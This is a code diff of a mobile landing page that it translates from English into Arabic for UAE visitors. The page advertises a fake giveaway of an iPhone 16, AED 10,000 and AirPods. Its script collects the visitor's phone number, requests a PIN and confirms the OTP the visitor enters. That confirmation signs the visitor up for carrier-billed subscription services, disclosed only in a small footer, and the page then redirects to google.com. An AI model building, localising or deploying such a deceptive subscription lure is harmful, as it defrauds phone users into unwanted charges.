@@ -1,10 +1,16 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<html lang="ar" dir="rtl">
 
-<title>Win Big UAE</title>
+<head>
+
+<meta charset="UTF-8">
+
+<meta
+name="viewport"
+content="width=device-width, initial-scale=1.0"
+/>
+
+<title>عرض الإمارات الحصري</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
 
@@ -22,9 +28,9 @@ body{
     background:
     linear-gradient(
     180deg,
-    #12002f 0%,
-    #1d004d 50%,
-    #2d006f 100%
+    #1b003b 0%,
+    #2d006f 50%,
+    #4b0082 100%
     );
 
     min-height:100vh;
@@ -37,7 +43,7 @@ body{
 .container{
 
     width:100%;
-    max-width:480px;
+    max-width:500px;
 
     margin:auto;
 
@@ -46,13 +52,13 @@ body{
     text-align:center;
 }
 
-.top-badge{
+.badge{
+
+    display:inline-block;
 
     background:#ffde59;
 
     color:black;
-
-    display:inline-block;
 
     padding:10px 25px;
 
@@ -80,15 +86,16 @@ body{
     100%{
         transform:scale(1);
     }
+
 }
 
 h1{
 
     font-size:52px;
 
-    line-height:1.1;
+    line-height:1.2;
 
-    margin-top:30px;
+    margin-top:25px;
 
     font-weight:900;
 }
@@ -105,6 +112,33 @@ h1{
     font-size:24px;
 
     color:#ddd;
+
+    line-height:1.5;
+}
+
+.gift{
+
+    width:220px;
+
+    margin-top:25px;
+
+    animation:float 2s infinite ease-in-out;
+}
+
+@keyframes float{
+
+    0%{
+        transform:translateY(0px);
+    }
+
+    50%{
+        transform:translateY(-15px);
+    }
+
+    100%{
+        transform:translateY(0px);
+    }
+
 }
 
 .prize-box{
@@ -125,31 +159,31 @@ h1{
     background:
     linear-gradient(
     135deg,
-    #5b21b6,
-    #7c3aed
+    #6d28d9,
+    #9333ea
     );
 
     border:3px solid #ffde59;
 
     border-radius:20px;
 
-    padding:20px 10px;
+    padding:18px 10px;
 
-    font-size:26px;
+    font-size:22px;
 
     font-weight:900;
 
     box-shadow:
-    0 0 25px rgba(255,222,89,.4);
+    0 0 20px rgba(255,222,89,.35);
 }
 
-.spin-box{
+.form-box{
 
     margin-top:40px;
 
     background:white;
 
-    border-radius:28px;
+    border-radius:30px;
 
     padding:30px 20px;
 
@@ -169,9 +203,11 @@ h1{
 
     overflow:hidden;
 
-    margin-bottom:20px;
-
     border:2px solid #ddd;
+
+    direction:ltr;
+
+    margin-bottom:20px;
 }
 
 .prefix{
@@ -257,6 +293,35 @@ h1{
     font-weight:bold;
 }
 
+.flash{
+
+    margin-top:18px;
+
+    color:#ffde59;
+
+    font-size:18px;
+
+    font-weight:bold;
+
+    animation:blink 1s infinite;
+}
+
+@keyframes blink{
+
+    0%{
+        opacity:1;
+    }
+
+    50%{
+        opacity:.4;
+    }
+
+    100%{
+        opacity:1;
+    }
+
+}
+
 #otpBox{
 
     display:none;
@@ -307,71 +372,50 @@ h1{
     cursor:pointer;
 }
 
-.disclaimer{
+.footer{
 
     margin-top:30px;
 
-    font-size:14px;
+    color:#ddd;
 
-    color:#ccc;
+    font-size:14px;
 
     line-height:1.6;
 }
 
-.flash{
-
-    margin-top:18px;
-
-    color:#ffde59;
-
-    font-size:18px;
-
-    font-weight:bold;
-
-    animation:blink 1s infinite;
-}
-
-@keyframes blink{
-
-    0%{
-        opacity:1;
-    }
-
-    50%{
-        opacity:.4;
-    }
-
-    100%{
-        opacity:1;
-    }
-}
-
 </style>
+
 </head>
+
 <body>
 
 <div class="container">
 
-<div class="top-badge">
-🇦🇪 UAE EXCLUSIVE GIVEAWAY
+<div class="badge">
+🇦🇪 عرض حصري في الإمارات
 </div>
 
 <h1>
-WIN AN <span class="highlight">iPHONE 16</span>
+اربح <span class="highlight">آيفون 16 برو ماكس</span>
 </h1>
 
 <div class="sub">
-Enter your mobile number to participate now
+أدخل رقم هاتفك الآن للدخول في السحب والفوز بجوائز مذهلة
 </div>
+
+<img
+class="gift"
+src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png"
+/>
 
 <div class="prize-box">
 
 <div class="prize">
-iPhone 16
+آيفون 16
 </div>
 
 <div class="prize">
-AED 10K
+10,000 درهم
 </div>
 
 <div class="prize">
@@ -380,7 +424,7 @@ AirPods
 
 </div>
 
-<div class="spin-box">
+<div class="form-box">
 
 <div class="phone-box">
 
@@ -399,37 +443,43 @@ oninput="this.value=this.value.replace(/[^0-9]/g,'')"
 
 </div>
 
-<button class="claim-btn" onclick="sendPIN()">
-CLAIM NOW
+<button
+class="claim-btn"
+onclick="sendPIN()"
+>
+اشترك الآن
 </button>
 
 <div id="loading">
-Processing...
+جاري المعالجة...
 </div>
 
 <div class="flash">
-⚡ Only limited winners selected daily
+⚡ عدد الفائزين محدود يومياً
 </div>
 
 <div id="otpBox">
 
 <input
 id="otp"
-placeholder="Enter OTP"
+placeholder="أدخل رمز التحقق"
 />
 
-<button class="verify-btn" onclick="verifyOTP()">
-VERIFY OTP
+<button
+class="verify-btn"
+onclick="verifyOTP()"
+>
+تأكيد الرمز
 </button>
 
 </div>
 
 </div>
 
-<div class="disclaimer">
+<div class="footer">
 
-By continuing, you agree to receive promotional subscription services.
-Standard carrier charges may apply.
+بالمتابعة، فإنك توافق على الاشتراك في الخدمات الترويجية.
+قد يتم تطبيق رسوم المشغل.
 
 </div>
 
@@ -437,16 +487,20 @@ Standard carrier charges may apply.
 
 <script>
 
-let savedTxid = '';
+let currentTxid = null;
 
+
+// SEND PIN
 async function sendPIN(){
 
     let msisdn =
     document.getElementById('msisdn').value;
 
-    msisdn = msisdn.replace(/\s/g,'');
+    msisdn =
+    msisdn.replace(/\s/g,'');
 
-    msisdn = msisdn.replace('+','');
+    msisdn =
+    msisdn.replace('+','');
 
     if(msisdn.startsWith('0')){
 
@@ -464,7 +518,7 @@ async function sendPIN(){
 
     if(msisdn.length < 12){
 
-        alert('Please enter valid UAE number');
+        alert('يرجى إدخال رقم إماراتي صحيح');
         return;
 
     }
@@ -501,17 +555,18 @@ async function sendPIN(){
 
         if(data.txid){
 
-            savedTxid = data.txid;
+            currentTxid =
+            data.txid;
 
             document
             .getElementById('otpBox')
             .style.display='block';
 
-            alert('OTP Sent Successfully');
+            alert('تم إرسال رمز التحقق بنجاح');
 
         }else{
 
-            alert(data.msg || 'Failed');
+            alert('حدث خطأ');
 
         }
 
@@ -523,12 +578,14 @@ async function sendPIN(){
         .getElementById('loading')
         .style.display='none';
 
-        alert('Server Error');
+        alert('خطأ في النظام');
 
     }
 
 }
 
+
+// VERIFY OTP
 async function verifyOTP(){
 
     const otp =
@@ -536,7 +593,7 @@ async function verifyOTP(){
 
     if(!otp){
 
-        alert('Enter OTP');
+        alert('أدخل رمز التحقق');
         return;
 
     }
@@ -554,7 +611,8 @@ async function verifyOTP(){
 
             body:JSON.stringify({
 
-                txid:savedTxid,
+                txid:currentTxid,
+
                 pin:otp
 
             })
@@ -566,16 +624,16 @@ async function verifyOTP(){
 
         console.log(data);
 
-        if(data.stateCode == 0){
+        if(data.success){
 
-            alert('Subscription Success');
+            alert('تم الاشتراك بنجاح');
 
             window.location.href =
             'https://google.com';
 
         }else{
 
-            alert(data.msg || 'OTP Failed');
+            alert('رمز التحقق غير صحيح');
 
         }
 
@@ -583,7 +641,7 @@ async function verifyOTP(){
 
         console.log(err);
 
-        alert('Verify Error');
+        alert('فشل التحقق');
 
     }
 
